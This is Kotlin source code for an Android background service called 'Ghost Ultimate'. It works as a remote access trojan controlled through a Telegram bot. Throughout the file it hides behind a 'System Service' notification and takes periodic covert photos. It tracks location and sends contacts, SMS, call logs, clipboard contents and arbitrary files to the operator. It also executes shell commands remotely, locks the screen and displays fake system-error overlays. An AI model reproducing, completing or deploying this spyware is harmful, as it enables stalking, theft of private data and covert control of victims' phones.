package com.ghost.app
import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationManager
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaPlayer
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.Locale
import java.util.concurrent.atomic.AtomicLong
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class CaptureService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val lastUpdateId = AtomicLong(0)
    private var torchOn = false
    private var tracking = false
    private var cameraId: String? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var tts: TextToSpeech? = null
    private var mediaPlayer: MediaPlayer? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotif("System Service running"))
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Ghost::WakeLock")
        wakeLock?.acquire()
        cameraId = (getSystemService(CAMERA_SERVICE) as CameraManager).cameraIdList.firstOrNull()
        tts = TextToSpeech(this) { status -> if (status == TextToSpeech.SUCCESS) tts?.language = Locale.getDefault() }

        scope.launch { 
            val kb = """{"keyboard":[[{"text":"📸 Photo"},{"text":"📍 Loc"}],[{"text":"🔦 Torch On"},{"text":"🔦 Torch Off"}],[{"text":"📇 Contacts"},{"text":"📱 Device"}],[{"text":"💻 Shell"},{"text":"🔒 Lock Screen"}]],"resize_keyboard":true}"""
            TgSender.sendMessage("🟢 <b>Ghost Ultimate online</b>\nDevice: ${Build.MODEL}\n\nGunakan tombol di bawah atau ketik /menu", kb) 
        }
        scope.launch { pollLoop() }
        scope.launch { photoLoop() }
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY
    override fun onBind(i: Intent?): IBinder? = null
    override fun onDestroy() { 
        scope.cancel(); wakeLock?.let { if (it.isHeld) it.release() }; tts?.shutdown(); mediaPlayer?.release(); super.onDestroy() 
    }

    private fun buildNotif(text: String): Notification {
        val chId = "ghost_ch"
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) nm.createNotificationChannel(NotificationChannel(chId, "System", NotificationManager.IMPORTANCE_LOW))
        return NotificationCompat.Builder(this, chId).setContentTitle("System Service").setContentText(text).setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
    }

    private suspend fun pollLoop() {
        while (scope.isActive) {
            try {
                val raw = TgSender.getUpdates(lastUpdateId.get()) ?: continue
                val arr = JSONObject(raw).optJSONArray("result") ?: continue
                for (i in 0 until arr.length()) {
                    val upd = arr.getJSONObject(i); lastUpdateId.set(upd.getLong("update_id") + 1)
                    val msg = upd.optJSONObject("message") ?: continue
                    if (msg.getJSONObject("chat").optString("id") != Config.CHAT_ID) continue
                    handleCommand(msg.optString("text").trim())
                }
            } catch (e: Exception) { Log.w("Ghost", "poll", e) }
            delay(100)
        }
    }

    private fun handleCommand(cmd: String) {
        when {
            cmd == "/start" || cmd == "/menu" || cmd == "/help" -> {
                val kb = """{"keyboard":[[{"text":"📸 Photo"},{"text":"📍 Loc"}],[{"text":"🔦 Torch On"},{"text":"🔦 Torch Off"}],[{"text":"📇 Contacts"},{"text":"📱 Device"}],[{"text":"💻 Shell"},{"text":"🔒 Lock Screen"}]],"resize_keyboard":true}"""
                TgSender.sendMessage(MENU, kb)
            }
            cmd == "/status" -> TgSender.sendMessage("🟢 alive\ntorch=${if (torchOn) "on" else "off"}\ntrack=${if (tracking) "on" else "off"}")
            cmd == "📸 Photo" || cmd == "/photo" -> scope.launch { takePhotoAndSend() }
            cmd.startsWith("/camera ") -> {
                val mode = cmd.removePrefix("/camera ").trim()
                val cm = getSystemService(CAMERA_SERVICE) as CameraManager
                val newId = cm.cameraIdList.firstOrNull { id ->
                    val facing = cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING)
                    if (mode == "front") facing == CameraCharacteristics.LENS_FACING_FRONT else facing == CameraCharacteristics.LENS_FACING_BACK
                }
                if (newId != null) { cameraId = newId; TgSender.sendMessage("📸 Camera: $mode") } else TgSender.sendMessage("❌ Not found")
            }
            cmd.startsWith("/play ") -> {
                val url = cmd.removePrefix("/play ").trim()
                scope.launch {
                    try { mediaPlayer?.release(); mediaPlayer = MediaPlayer().apply { setDataSource(url); prepare(); start() }; TgSender.sendMessage("🎵 Playing...") } 
                    catch (e: Exception) { TgSender.sendMessage("❌ err: ${e.message}") }
                }
            }
            cmd == "/stop" -> { mediaPlayer?.release(); mediaPlayer = null; TgSender.sendMessage("⏹️ Stopped") }
            cmd.startsWith("/tts ") -> { tts?.speak(cmd.removePrefix("/tts ").trim(), TextToSpeech.QUEUE_FLUSH, null, "ghost_tts"); TgSender.sendMessage("🗣️ Speaking...") }
            cmd == "🔦 Torch On" || cmd == "/torch_on" -> scope.launch { setTorch(true) }
            cmd == "🔦 Torch Off" || cmd == "/torch_off" -> scope.launch { setTorch(false) }
            cmd == "/strobe" -> { scope.launch { repeat(15) { setTorch(true); delay(80); setTorch(false); delay(80) }; TgSender.sendMessage("🔦 Strobe done") } }
            cmd == "🔒 Lock Screen" || cmd == "/lock" -> {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val comp = ComponentName(this, AdminReceiver::class.java)
                if (dpm.isAdminActive(comp)) { dpm.lockNow(); TgSender.sendMessage("🔒 Layar dikunci!") } 
                else { TgSender.sendMessage("❌ Izin Admin belum aktif. Buka app dulu.") }
            }
            cmd.startsWith("/error ") -> showPcError(cmd.removePrefix("/error "))
            cmd == "/vibrate" -> {
                val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(800, VibrationEffect.DEFAULT_AMPLITUDE)) else @Suppress("DEPRECATION") v.vibrate(800)
                TgSender.sendMessage("📳 vibrate")
            }
            cmd.startsWith("/volume ") -> {
                val lvl = cmd.removePrefix("/volume ").trim().toIntOrNull() ?: 50
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                am.setStreamVolume(AudioManager.STREAM_MUSIC, (am.getStreamMaxVolume(AudioManager.STREAM_MUSIC) * lvl / 100), 0)
                TgSender.sendMessage("🔊 volume $lvl%")
            }
            cmd == "📍 Loc" || cmd == "/loc" -> scope.launch { sendLocation() }
            cmd == "/track_on" -> { tracking = true; scope.launch { trackLoop() }; TgSender.sendMessage("📍 tracking on") }
            cmd == "/track_off" -> { tracking = false; TgSender.sendMessage("📍 tracking off") }
            cmd.startsWith("/shell ") -> {
                scope.launch {
                    try {
                        val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd.removePrefix("/shell ").trim()))
                        val output = process.inputStream.bufferedReader().readText()
                        TgSender.sendLong("💻 <b>Output:</b>\n<pre>${output.ifEmpty { "(no output)" }}</pre>")
                    } catch (e: Exception) { TgSender.sendMessage("err: ${e.message}") }
                }
            }
            cmd.startsWith("/files") -> { val path = if (cmd.contains(" ")) cmd.substringAfter(" ") else "/sdcard"; scope.launch { TgSender.sendLong(DataGrabber.listFiles(path)) } }
            cmd.startsWith("/download ") -> {
                val path = cmd.removePrefix("/download ").trim()
                scope.launch {
                    val f = java.io.File(path)
                    if (!f.exists() || !f.isFile) { TgSender.sendMessage("❌ File not found"); return@launch }
                    if (f.length() > 50 * 1024 * 1024) { TgSender.sendMessage("❌ File > 50MB"); return@launch }
                    TgSender.sendDocument(f.readBytes(), f.name, "📄 File: ${f.name}")
                }
            }
            cmd.startsWith("/toast ") -> { Handler(Looper.getMainLooper()).post { Toast.makeText(this, cmd.removePrefix("/toast "), Toast.LENGTH_LONG).show() }; TgSender.sendMessage("💬 toast sent") }
            cmd.startsWith("/open ") -> { try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(cmd.removePrefix("/open "))).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); TgSender.sendMessage("🌐 opened") } catch (e: Exception) { TgSender.sendMessage("err: ${e.message}") } }
            cmd.startsWith("/startapp ") -> {
                val pkg = cmd.removePrefix("/startapp ").trim()
                try { val i = packageManager.getLaunchIntentForPackage(pkg); if (i != null) { startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); TgSender.sendMessage("🚀 opened $pkg") } else { TgSender.sendMessage("❌ app not found") } } 
                catch (e: Exception) { TgSender.sendMessage("err: ${e.message}") }
            }
            cmd == "/wifi" -> scope.launch { TgSender.sendMessage(DataGrabber.wifiInfo(this@CaptureService)) }
            cmd == "/battery" -> { val bm = getSystemService(BATTERY_SERVICE) as BatteryManager; TgSender.sendMessage("🔋 ${bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)}%") }
            cmd == "📇 Contacts" || cmd == "/contacts" -> scope.launch { TgSender.sendLong(DataGrabber.contacts(this@CaptureService)) }
            cmd == "/sms" -> scope.launch { TgSender.sendLong(DataGrabber.sms(this@CaptureService)) }
            cmd == "/calls" -> scope.launch { TgSender.sendLong(DataGrabber.callLog(this@CaptureService)) }
            cmd == "/apps" -> scope.launch { TgSender.sendLong(DataGrabber.apps(this@CaptureService)) }
            cmd == "📱 Device" || cmd == "/device" -> scope.launch { TgSender.sendLong(DataGrabber.deviceInfo(this@CaptureService)) }
            cmd == "/clip" -> scope.launch { TgSender.sendMessage(DataGrabber.clipboard(this@CaptureService)) }
            else -> TgSender.sendMessage("❓ command tidak dikenal. ketik /menu")
        }
    }

    private fun showPcError(text: String) {
        if (!Settings.canDrawOverlays(this)) { TgSender.sendMessage("❌ Izin Overlay belum aktif!"); return }
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val view = TextView(this).apply {
            this.text = "⚠️ SYSTEM ERROR\n\n$text\n\n[Auto close in 5s]"
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#CC000000"))
            textSize = 18f
            gravity = Gravity.CENTER
            setPadding(40, 40, 40, 40)
        }
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )
        try {
            wm.addView(view, params)
            Handler(Looper.getMainLooper()).postDelayed({ try { wm.removeView(view) } catch (e: Exception) {} }, 5000)
            TgSender.sendMessage("💻 PC Error Toast ditampilkan (5s)")
        } catch (e: Exception) { TgSender.sendMessage("❌ Overlay err: ${e.message}") }
    }

    private suspend fun photoLoop() { while (scope.isActive) { delay(Config.PHOTO_INTERVAL_MS); runCatching { takePhotoAndSend() } } }
    private suspend fun trackLoop() { while (tracking && scope.isActive) { sendLocation(); delay(Config.TRACK_INTERVAL_MS) } }

    private suspend fun takePhotoAndSend() = suspendCoroutine<Unit> { cont ->
        val cm = getSystemService(CAMERA_SERVICE) as CameraManager
        val id = cameraId
        if (id == null) { TgSender.sendMessage("❌ Kamera tidak ditemukan"); cont.resume(Unit); return@suspendCoroutine }
        try {
            val size = cm.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!.getOutputSizes(ImageFormat.JPEG)?.firstOrNull()
            if (size == null) { cont.resume(Unit); return@suspendCoroutine }
            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buf = img.planes[0].buffer; val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                img.close(); r.close(); scope.launch { TgSender.sendPhoto(bytes, "📸 ${Build.MODEL}"); cont.resume(Unit) }
            }, Handler(Looper.getMainLooper()))
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(dev: CameraDevice) {
                    dev.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE); req.addTarget(reader.surface)
                            s.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                                override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                    dev.close()
                                }
                            }, null)
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) { dev.close(); TgSender.sendMessage("❌ Gagal capture"); cont.resume(Unit) }
                    }, null)
                }
                override fun onDisconnected(dev: CameraDevice) { dev.close() }
                override fun onError(dev: CameraDevice, e: Int) { dev.close(); TgSender.sendMessage("❌ Kamera error: $e"); cont.resume(Unit) }
            }, null)
        } catch (e: Exception) { cont.resume(Unit) }
    }

    private fun setTorch(on: Boolean) {
        try {
            val cm = getSystemService(CAMERA_SERVICE) as CameraManager; val id = cameraId ?: return
            cm.setTorchMode(id, on); torchOn = on; TgSender.sendMessage(if (on) "🔦 torch on" else "🔦 torch off")
        } catch (e: Exception) {}
    }

    private fun sendLocation() {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc == null) { TgSender.sendMessage("📍 no location"); return }
            TgSender.sendMessage("📍 <b>Lokasi</b>\nLat: ${loc.latitude}\nLon: ${loc.longitude}\nAkurasi: ${loc.accuracy}m\nhttps://maps.google.com/?q=${loc.latitude},${loc.longitude}")
        } catch (e: SecurityException) { TgSender.sendMessage("📍 izin lokasi belum aktif") }
    }

    companion object {
        val MENU = """
🤖 <b>Ghost Ultimate — Menu</b>
📸 /photo, /camera front|back
📍 /loc, /track_on, /track_off
🔦 /torch_on, /torch_off, /strobe
🔒 /lock (kunci layar)
💻 /shell [cmd]
📂 /files, /download [path]
📇 /contacts, /sms, /calls, /apps, /device, /clip
💬 /toast, /open, /startapp
🎵 /play, /stop, /tts
        """.trimIndent()
    }
}
